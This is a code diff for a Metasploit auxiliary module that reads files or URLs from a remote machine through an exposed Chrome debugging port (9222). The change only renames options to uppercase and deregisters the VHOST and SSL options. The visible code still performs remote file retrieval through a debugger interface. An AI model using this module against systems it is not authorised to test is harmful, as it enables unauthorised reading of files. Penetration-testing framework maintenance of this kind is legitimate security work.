@@ -29,18 +29,20 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RHOST,
         Opt::RPORT(9222),
-        OptString.new('FilePath', [ false, 'File to fetch from remote machine.']),
-        OptString.new('Url', [ false, 'Url to fetch from remote machine.']),
-        OptInt.new('Timeout', [ true, 'Time to wait for response', 10])
+        OptString.new('FILEPATH', [ false, 'File to fetch from remote machine.']),
+        OptString.new('URL', [ false, 'Url to fetch from remote machine.']),
+        OptInt.new('TIMEOUT', [ true, 'Time to wait for response', 10])
       ]
     )
 
     deregister_options('Proxies')
+    deregister_options('VHOST')
+    deregister_options('SSL')
   end
 
   def run
 
-    if (datastore['FilePath'].nil? || datastore['FilePath'].empty?) && (datastore['Url'].nil? || datastore['Url'].empty?)
+    if (datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?) && (datastore['URL'].nil? || datastore['URL'].empty?)
       print_error('Must set FilePath or Url')
       return
     end
@@ -55,8 +57,8 @@ class MetasploitModule < Msf::Auxiliary
     else
       data = JSON.parse(res.body).pop
       EM.run {
-        file_path = datastore['FilePath']
-        url = datastore['Url']
+        file_path = datastore['FILEPATH']
+        url = datastore['URL']
 
         if file_path
           fetch_uri = "file://#{file_path}"
@@ -113,7 +115,7 @@ class MetasploitModule < Msf::Auxiliary
           end
         end
 
-        EM::Timer.new(datastore['Timeout']) do
+        EM::Timer.new(datastore['TIMEOUT']) do
           EventMachine.stop
           fail_with(Failure::Unknown, 'Unknown failure occurred') if not @succeeded
         end
